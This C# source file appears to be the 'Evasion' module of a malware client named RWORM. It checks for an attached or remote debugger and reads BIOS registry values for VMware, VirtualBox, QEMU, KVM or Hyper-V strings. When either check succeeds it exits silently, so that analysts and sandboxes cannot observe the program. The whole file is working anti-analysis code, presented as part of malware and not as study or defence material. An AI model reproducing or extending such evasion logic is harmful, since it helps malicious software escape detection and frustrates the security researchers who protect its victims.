using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using RWORM.Client.Core;

namespace RWORM.Client.Modules
{
    public static class Evasion
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        public static void Run()
        {
            if (Config.AntiDebug && IsDebuggerPresent())
            {
                Environment.Exit(0);
            }

            if (Config.AntiVM && IsVirtualEnvironment())
            {
                Environment.Exit(0);
            }
        }

        private static bool IsDebuggerPresent()
        {
            if (Debugger.IsAttached) return true;

            try
            {
                bool isDebuggerPresent = false;
                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                if (isDebuggerPresent) return true;
            }
            catch { }

            return false;
        }

        private static bool IsVirtualEnvironment()
        {
            try
            {
                using var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\BIOS");
                if (key != null)
                {
                    var biosVersion = key.GetValue("SystemManufacturer")?.ToString() ?? "";
                    var biosProduct = key.GetValue("SystemProductName")?.ToString() ?? "";
                    var combined = $"{biosVersion} {biosProduct}".ToLowerInvariant();

                    if (combined.Contains("vmware") ||
                        combined.Contains("virtualbox") ||
                        combined.Contains("vbox") ||
                        combined.Contains("qemu") ||
                        combined.Contains("kvm") ||
                        combined.Contains("hyper-v"))
                    {
                        return true;
                    }
                }
            }
            catch { }

            return false;
        }
    }
}
